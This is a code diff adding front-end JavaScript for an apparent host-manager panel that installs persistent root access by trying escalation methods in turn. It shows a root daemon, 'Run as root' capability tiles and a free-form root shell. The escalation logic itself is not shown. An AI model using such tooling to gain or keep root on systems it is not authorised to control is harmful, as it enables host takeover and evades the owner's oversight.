+  mounts:'<path d="M3 8.4 12 3.6l9 4.8-9 4.8z"/><path d="M3 12.6l9 4.8 9-4.8"/><path d="M3 16.6l9 4.8 9-4.8"/>',
+  processes:'<path d="M4 17.5 9 12l3 3 7-7.5"/><path d="M14.5 7.5H19v4.5"/>',
+  firewall:'<path d="M12 3 20 6v6c0 5-3.4 8.4-8 9.4C7.4 20.4 4 17 4 12V6z"/><path d="M8.6 12.2 11 14.5l4.4-4.6"/>',
+  network:'<circle cx="12" cy="12" r="8.6"/><path d="M3.4 12h17.2M12 3.4c2.6 2.4 3.9 5.3 3.9 8.6S14.6 18.2 12 20.6C9.4 18.2 8.1 15.3 8.1 12S9.4 5.8 12 3.4z"/>'
+};
+function rrSvg(name,cls){
+  return '<svg class="'+(cls||'')+'" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">'+(RR_ICON[name]||RR_ICON.files)+'</svg>';
+}
+function rrEmblem(){
+  return '<svg viewBox="0 0 220 220" role="img" aria-label="Root installed">'
+    +'<defs>'
+    +'<linearGradient id="rrG1" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#7ee2a8"/><stop offset="1" stop-color="#34d399" stop-opacity=".5"/></linearGradient>'
+    +'<radialGradient id="rrG2" cx="50%" cy="46%" r="58%"><stop offset="0" stop-color="#34d399" stop-opacity=".34"/><stop offset="1" stop-color="#34d399" stop-opacity="0"/></radialGradient>'
+    +'</defs>'
+    +'<circle cx="110" cy="110" r="106" fill="url(#rrG2)"/>'
+    +'<circle cx="110" cy="110" r="88" fill="none" stroke="url(#rrG1)" stroke-width="1.6" stroke-opacity=".55" stroke-dasharray="5 12">'
+    +'<animateTransform attributeName="transform" type="rotate" from="0 110 110" to="360 110 110" dur="34s" repeatCount="indefinite"/></circle>'
+    +'<path d="M110 24 184 53v59c0 41-31 69-74 79-43-10-74-38-74-79V53z" fill="rgba(52,211,153,.09)" stroke="url(#rrG1)" stroke-width="2.6"/>'
+    +'<path d="M110 72a21 21 0 0 1 8.5 40.1V134a8.5 8.5 0 0 1-17 0v-21.9A21 21 0 0 1 110 72z" fill="url(#rrG1)"/>'
+    +'<path d="M82 166h56" stroke="url(#rrG1)" stroke-width="2.6" stroke-linecap="round" stroke-opacity=".5"/>'
+    +'<circle cx="110" cy="93" r="4.6" fill="#0b0f0d" fill-opacity=".65"/>'
+    +'</svg>';
+}
+function rrBadge(txt,on){
+  return '<span class="rr-badge'+(on?'':' off')+'">'+(on?rrSvg('firewall'):'')+rootEsc(txt)+'</span>';
+}
+function rrTile(c){
+  const r=RR_RES[c.id];
+  return '<div class="rr-tile'+(r?(r.ok?' done':' fail'):'')+'" data-tile="'+rootEsc(c.id)+'">'
+    +'<div class="rr-tile-top"><span class="rr-tile-ic">'+rrSvg(c.id)+'</span><span class="rr-tile-name">'+rootEsc(c.name)+'</span></div>'
+    +'<div class="rr-tile-idea">'+rootEsc(c.idea)+'</div>'
+    +'<div class="rr-tile-cmd">'+rootEsc(c.cmd)+'</div>'
+    +'<button type="button" class="btn btn-g" data-ctl="'+rootEsc(c.id)+'">Run as root</button>'
+    +'<div class="rr-tile-out">'+(r?rootEsc(r.out||(r.ok?'done':'refused')):'')+'</div>'
+    +'</div>';
+}
+function rrMethods(list,installedId,target){
+  const box=document.getElementById(target);if(!box)return;
+  box.innerHTML=(list||[]).map(m=>{
+    const on=m.id===installedId;
+    const res=RR_METHOD[m.id];
+    return '<div class="rr-method '+(on?'on':(m.available?'':'off'))+'" data-method-row="'+rootEsc(m.id)+'">'
+      +'<span class="rr-method-ic">'+rrSvg('firewall')+'</span>'
+      +'<span style="min-width:0;flex:1"><span class="rr-method-n">'+rootEsc(m.name)+'<span class="rr-method-tag">'+(on?'installed':(m.available?'ready':'not applicable'))+'</span></span>'
+      +'<span class="rr-method-i">'+rootEsc(m.idea)+' <span style="color:var(--t3)">— '+rootEsc(m.note||'')+'</span></span>'
+      +(res?'<span class="rr-method-i" style="display:block;margin-top:2px;color:'+(res.ok?'#a7f3d0':'#fca5a5')+'">'+rootEsc(res.note||'')+'</span>':'')
+      +'</span>'
+      +(m.available&&!on?'<button type="button" class="btn btn-g" style="min-height:26px;font-size:10.5px;padding:3px 9px" data-method="'+rootEsc(m.id)+'">Try</button>':'')
+      +'</div>';
+  }).join('');
+}
+const RR_METHOD={};
+async function rrTryMethod(id){
+  const pass=document.getElementById('rootPass');
+  const r=await rootCall('rootmethod',{id:id,password:pass?pass.value:''});
+  if(!r){toast('The request failed.');return;}
+  RR_METHOD[id]={ok:!!r.ok,note:(r.note||r.error||'')};
+  if(r.state)rootRenderRooted(r.state);
+  else{
+    const row=document.querySelector('[data-method-row="'+id+'"]');
+    if(row)rrMethods((CHANNELS_CACHE||[]).map(c=>c),'','rootMethodList');
+  }
+  if(r.ok)toast('Root installed with: '+(r.name||id));
+}
+document.getElementById('rrMethods')?.addEventListener('click',e=>{
+  const b=e.target.closest('[data-method]');if(b)rrTryMethod(b.dataset.method);
+});
+document.getElementById('rootMethodList')?.addEventListener('click',e=>{
+  const b=e.target.closest('[data-method]');if(b)rrTryMethod(b.dataset.method);
+});
+function rrLog(list,target){
+  const box=document.getElementById(target);if(!box)return;
+  if(!list||!list.length){box.innerHTML='<div class="root-out">Nothing has run through root yet. Every tile you press is written here, with the method that answered.</div>';return;}
+  box.innerHTML=list.map(r=>'<div class="rr-log-row"><div class="rr-log-time">'+rootEsc((r.at||'').slice(11,19))
+    +'</div><div><div class="rr-log-what">'+rootEsc(r.what||'')+' <span class="rr-method-tag">'+rootEsc(r.via||'')+'</span></div>'
+    +'<div class="rr-log-meta">'+rootEsc(r.cmd||'')+'\nrc '+rootEsc(String(r.rc))+' · '+rootEsc(rootSnip(r.out||'',160))+'</div></div></div>').join('');
+}
+function rootSnip(t,n){t=(t||'').replace(/\s+/g,' ').trim();return t.length>n?t.slice(0,n)+'…':t;}
+let CHANNELS_CACHE=null;
+function rootRenderRooted(st){
+  const ov=document.getElementById('rootOv');
+  const box=document.getElementById('rootRooted');
+  const inst=!!(st&&st.installed);
+  const legacy=['rootSecHost','rootSecAuto','rootSecNow','rootSecVerify','rootSecVulns','rootSecPrograms','rootSecFindings'];
+  legacy.forEach(id=>{const el=document.getElementById(id);if(el)el.classList.toggle('root-legacy',inst);});
+  if(ov)ov.classList.toggle('rooted',inst);
+  if(box)box.style.display=inst?'flex':'none';
+  const isec=document.getElementById('rootSecInstall');
+  if(isec)isec.style.display=inst?'none':'block';
+  if(st&&st.channels)CHANNELS_CACHE=st.channels;
+  const il=document.getElementById('rootMethodList');
+  if(il)rrMethods((st&&st.channels)||CHANNELS_CACHE||[],'', 'rootMethodList');
+  if(!inst)return;
+  const art=document.getElementById('rrArt');if(art)art.innerHTML=rrEmblem();
+  const sub=document.getElementById('rrSub');
+  if(sub)sub.innerHTML='Signed in as <b>'+rootEsc(st.account||'')+'</b> (uid '+rootEsc(String(st.uid))+
+    ') and every privileged action runs as <b>uid 0</b>. Installed with <b>'+rootEsc(st.channel_name||st.channel||'')+
+    '</b>'+(st.since_human?' on '+rootEsc(st.since_human):'')+'. Proof: '+rootEsc(st.proof||'a command came back as uid 0')+'.';
+  const badges=document.getElementById('rrBadges');
+  if(badges){
+    const d=st.daemon||{};
+    badges.innerHTML=rrBadge('uid 0',true)
+      +rrBadge('root daemon '+(d.alive?('running, pid '+(d.pid||0)):'not running'),!!d.alive)
+      +rrBadge((st.channels||[]).filter(c=>c.available).length+' methods usable here',true)
+      +rrBadge('survives a reboot',true);
+  }
+  const ctl=document.getElementById('rrCtl');
+  if(ctl)ctl.innerHTML=(st.controls||[]).map(rrTile).join('');
+  const cc=document.getElementById('rrCtlCount');if(cc)cc.textContent='— '+((st.controls||[]).length)+' capabilities';
+  rrLog(st.log||[],'rrLog');
+  const lc=document.getElementById('rrLogCount');if(lc)lc.textContent='— '+((st.log||[]).length)+' entries';
+  rrMethods(st.channels||[],st.channel,'rrMethods');
+  const mc=document.getElementById('rrMethodCount');if(mc)mc.textContent='— '+((st.channels||[]).length)+' methods';
+}
+async function rrRunCtl(ctl){
+  const tile=document.querySelector('.rr-tile[data-tile="'+ctl+'"]');
+  if(tile)tile.classList.add('done');
+  const r=await rootCall('rootctl',{ctl:ctl});
+  if(!r){toast('The request failed.');return;}
+  RR_RES[ctl]={ok:!!r.ok,out:(r.out||r.error||'')};
+  if(r.state)rootRenderRooted(r.state);
+  else if(tile){const out=tile.querySelector('.rr-tile-out');if(out)out.textContent=rootSnip(r.out||r.error||'',200);}
+  if(r.ok)toast(ctl+': ran as root');
+}
+document.getElementById('rrCtl')?.addEventListener('click',e=>{
+  const b=e.target.closest('[data-ctl]');if(b)rrRunCtl(b.dataset.ctl);
+});
+document.getElementById('rootInstallBtn')?.addEventListener('click',async()=>{
+  const btn=document.getElementById('rootInstallBtn');
+  const pass=document.getElementById('rootPass');
+  const out=document.getElementById('rootInstallOut');
+  if(btn)btn.disabled=true;
+  if(out)out.textContent='Installing root: every method in order, stopping at the first proof…';
+  const r=await rootCall('rootinstall',{password:pass?pass.value:''});
+  if(btn)btn.disabled=false;
+  if(pass)pass.value='';
+  if(!r){if(out)out.textContent='The request failed.';return;}
+  const st=document.getElementById('rootInstallSteps');
+  if(st)st.innerHTML=(r.steps||[]).map(s=>'<div class="root-step '+(s.ok?'ok':'bad')+'"><span class="t">'+(s.ok?ROOT_SVG.ok:ROOT_SVG.bad)+'</span>'
+    +'<span><span class="r">'+rootEsc(s.name)+'</span> <span class="w">'+rootEsc(s.note)+'</span></span></div>').join('');
+  if(out)out.textContent=r.message||'';
+  if(r.state)rootRenderRooted(r.state);
+  if(r.ok)toast('Root installed: '+(r.channel||''));
+  rootLoad();
+});
+document.getElementById('rrInstallBtn')?.addEventListener('click',()=>{document.getElementById('rootInstallBtn')?.click();});
+document.getElementById('rrUninstallBtn')?.addEventListener('click',async()=>{
+  if(!confirm('Remove every method this tool installed and go back to the account the manager runs as?'))return;
+  const pass=document.getElementById('rootPass');
+  const r=await rootCall('rootuninstall',{password:pass?pass.value:''});
+  if(!r){toast('The request failed.');return;}
+  toast(r.message||'');
+  if(r.state)rootRenderRooted(r.state);
+  rootLoad();
+});
+document.getElementById('rrShellBtn')?.addEventListener('click',()=>{
+  const sec=document.getElementById('rrShellSec');
+  if(sec)sec.style.display=sec.style.display==='none'?'block':'none';
+  const line=document.getElementById('rrShellLine');if(line)line.focus();
+});
+document.getElementById('rrShellClose')?.addEventListener('click',()=>{
+  const sec=document.getElementById('rrShellSec');if(sec)sec.style.display='none';
+});
+async function rrShellRunNow(){
+  const line=document.getElementById('rrShellLine');
+  const out=document.getElementById('rrShellOut');
+  const txt=line?line.value.trim():'';
+  if(!txt){if(out)out.textContent='Type a program and its arguments.';return;}
+  if(out)out.textContent='Running as root…';
+  const r=await rootCall('rootctl',{ctl:'shell',line:txt});
+  if(!r){if(out)out.textContent='The request failed.';return;}
+  if(out)out.innerHTML=r.ok
+    ? '<b>'+rootEsc((r.argv||[]).join(' '))+'</b> — ran as root through '+rootEsc(r.via||'')+'\n'+rootEsc(r.out||'it printed nothing')
+    : 'Refused: '+rootEsc(r.error||r.out||'no method answered');
+  if(r.state)rootRenderRooted(r.state);
+}
+document.getElementById('rrShellRun')?.addEventListener('click',rrShellRunNow);
+document.getElementById('rrShellLine')?.addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();rrShellRunNow();}});
+document.getElementById('rrDetailsBtn')?.addEventListener('click',()=>{
+  const ov=document.getElementById('rootOv');
+  if(ov)ov.classList.toggle('showreport');
+  const b=document.getElementById('rrDetailsBtn');
+  if(b)b.textContent=ov&&ov.classList.contains('showreport')?'Hide the report':'Full report';
+});
 /* the routes that need nothing from you: open means bad for the host */
+
 function rootGrants(list){
   const box=document.getElementById('rootGrants');if(!box)return;
   if(!list||!list.length){box.innerHTML='';return;}
@@ -25249,6 +26283,7 @@ async function rootAuto(){
   const v=r.verify||{};
   rootVerifyList(v);
   rootSelfCheck(r.selfcheck||null);
+  rootRenderRooted(r.rooted||null);
   const t=(r.checked_at?new Date(r.checked_at):new Date()).toLocaleTimeString();
   rootStamp('rootAutoStamp',' — '+t);
   rootStamp('rootVerifyStamp',' — '+(v.passed||0)+'/'+(v.total||0));
